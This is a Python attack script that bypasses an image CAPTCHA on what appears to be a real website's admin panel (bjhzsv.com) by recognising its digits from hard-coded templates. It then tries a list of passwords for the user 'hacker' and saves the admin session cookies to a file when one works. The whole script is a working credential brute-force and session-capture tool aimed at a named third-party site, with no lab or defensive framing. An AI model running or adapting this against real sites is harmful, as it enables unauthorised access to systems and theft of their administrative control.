import sys
from PIL import Image
import requests

P = {}
P[0] = [" #### ","#    #","#    #","#    #","#    #","#    #","#    #","#    #","#    #"," #### "]
P[1] = ["  #  "," ##  ","  #  ","  #  ","  #  ","  #  ","  #  ","  #  ","  #  ","#####"]
P[2] = [" #### ","#    #","     #","     #","    # ","   #  ","  #   "," #    ","#     ","######"]
P[3] = [" #### ","#    #","     #","     #","  ### ","     #","     #","     #","#    #"," #### "]
P[4] = ["    # ","   ## ","  # # ","  # # "," #  # ","#   # ","######","    # ","    # ","   ###"]
P[5] = ["######","#     ","#     ","#     ","##### ","     #","     #","     #","#    #"," #### "]
P[6] = [" #### ","#    #","#     ","#     ","####  ","#    #","#    #","#    #","#    #"," #### "]
P[7] = ["######","#    #","    # ","    # ","   #  ","   #  ","  #   ","  #   "," #    "," #    "]
P[8] = [" #### ","#    #","#    #","#    #"," #### ","#    #","#    #","#    #","#    #"," #### "]
P[9] = [" #### ","#    #","#    #","#    #"," #### ","     #","     #","     #","#    #"," #### "]

def trim(ln):
    fr, lr = 0, len(ln)-1
    while fr < len(ln) and all(c==" " for c in ln[fr]): fr+=1
    while lr >= 0 and all(c==" " for c in ln[lr]): lr-=1
    if fr > lr: return None
    fc, lc = len(ln[0]), 0
    for r in range(fr, lr+1):
        for c,ch in enumerate(ln[r]):
            if ch!=" ": fc,lc = min(fc,c), max(lc,c)
    return [ln[r][fc:lc+1] for r in range(fr,lr+1)]

def cmp(ln, d):
    tc, tp = trim(ln), trim(P[d])
    if tc is None or tp is None: return 999
    ch_h,ch_w = len(tc), len(tc[0])
    ph,pw = len(tp), len(tp[0])
    if abs(ch_h-ph)>3 or abs(ch_w-pw)>3: return 999
    mt,tl = 0,0
    for r in range(min(ch_h,ph)):
        for c in range(min(ch_w,pw)):
            tl+=1
            if (tc[r][c]=="#") == (tp[r][c]=="#"): mt+=1
    return (1-mt/tl)*100 if tl>0 else 999

def solve(path):
    img = Image.open(path)
    px = list(img.getdata())
    bg = (238,238,238)
    w,h = 40,10
    col_has = []
    for x in range(w):
        has = False
        for y in range(h):
            p = px[y*w+x]
            v = p if isinstance(p,tuple) else (p,p,p)
            if v != bg:
                has = True
                break
        col_has.append(has)
    segs = []
    in_char = False
    sx = 0
    for x in range(w):
        if col_has[x] and not in_char:
            sx = x
            in_char = True
        elif not col_has[x] and in_char:
            segs.append((sx, x-1))
            in_char = False
    if in_char:
        segs.append((sx, w-1))
    results = []
    for sx, ex in segs:
        seg_colors = {}
        for x in range(sx, ex+1):
            for y in range(h):
                p = px[y*w+x]
                v = p if isinstance(p,tuple) else (p,p,p)
                if v != bg:
                    seg_colors[v] = seg_colors.get(v, 0) + 1
        dom = max(seg_colors.items(), key=lambda kv: kv[1])[0]
        mn_x, mx_x, mn_y, mx_y = ex, sx, h, 0
        for x in range(sx, ex+1):
            for y in range(h):
                p = px[y*w+x]
                v = p if isinstance(p,tuple) else (p,p,p)
                if v == dom:
                    mn_x = min(mn_x, x)
                    mx_x = max(mx_x, x)
                    mn_y = min(mn_y, y)
                    mx_y = max(mx_y, y)
        lines = []
        for y2 in range(mn_y, mx_y+1):
            line = ""
            for x2 in range(mn_x, mx_x+1):
                p = px[y2*w+x2]
                v = p if isinstance(p,tuple) else (p,p,p)
                line += "#" if v == dom else " "
            lines.append(line)
        best = (999, -1)
        for d in range(10):
            sc = cmp(lines, d)
            if sc < best[0]:
                best = (sc, d)
        results.append((sx, best[1], best[0]))
    results.sort(key=lambda x: x[0])
    return "".join(str(r[1]) for r in results)

passwords = ["Pwned123!", "Pwned123", "pwned123!", "hacker", "admin", "123456", "password", "Pwned123456", "Hacker123!", "hacker123"]

for pw in passwords:
    s = requests.Session()
    r = s.get("http://bjhzsv.com/main/inc/code.asp")
    with open("/tmp/_c.bmp","wb") as f:
        f.write(r.content)
    code = solve("/tmp/_c.bmp")
    r = s.post("http://bjhzsv.com/main/a7chkuser.asp", 
               data={"t1":"hacker","t2":pw,"t3":code},
               allow_redirects=True)
    resp = r.text
    if "admin_main" in resp or "admin_left" in resp:
        print("SUCCESS with password: " + pw + " code=" + code)
        import json
        with open("/tmp/admin_cookies.json","w") as f:
            json.dump(dict(s.cookies), f)
        break
    else:
        idx = resp.find("alert")
        if idx > 0 and idx < 100:
            alert_text = resp[idx:idx+60]
            print("pw=" + pw + " code=" + code + " -> " + alert_text)
        else:
            print("pw=" + pw + " code=" + code + " -> no alert")
